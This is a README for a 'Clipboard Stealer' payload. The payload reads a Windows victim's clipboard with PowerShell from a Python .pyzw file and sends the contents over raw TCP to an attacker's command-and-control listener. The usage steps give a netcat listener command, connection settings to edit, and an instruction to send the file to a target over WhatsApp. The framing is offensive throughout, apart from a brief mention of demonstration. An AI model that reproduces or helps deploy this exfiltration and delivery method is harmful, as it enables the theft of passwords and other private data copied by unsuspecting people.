# Clipboard Stealer

This payload extracts the current text contents of the Windows clipboard and exfiltrates it to a Netcat listener.

## How it Works

It uses Python's `subprocess` module to call PowerShell's `Get-Clipboard` cmdlet. This approach is taken to:
1. Avoid requiring external dependencies like `pyperclip`.
2. Bypass potential restrictions in the `.pyzw` execution context that might block direct clipboard API hooks using native Windows APIs (e.g. ctypes/user32).

Once the clipboard data is retrieved, it connects via raw TCP to the specified C2 listener and sends the data.

## Usage

1. Start your Netcat listener on your Command and Control (C2) machine:
   ```bash
   nc -lvnp 9001 > exfiltrated_clipboard.txt
   ```

2. Open `clipboard.pyz` (or `clipboard.pyzw`) and modify the connection details:
   ```python
   nc_host = "192.168.1.55"  # Replace with your listener's IP
   nc_port = 9001            # Replace with your listener's port
   ```

3. Send the modified `.pyzw` file to the target via WhatsApp to demonstrate the execution of the clipboard hijacking attack.
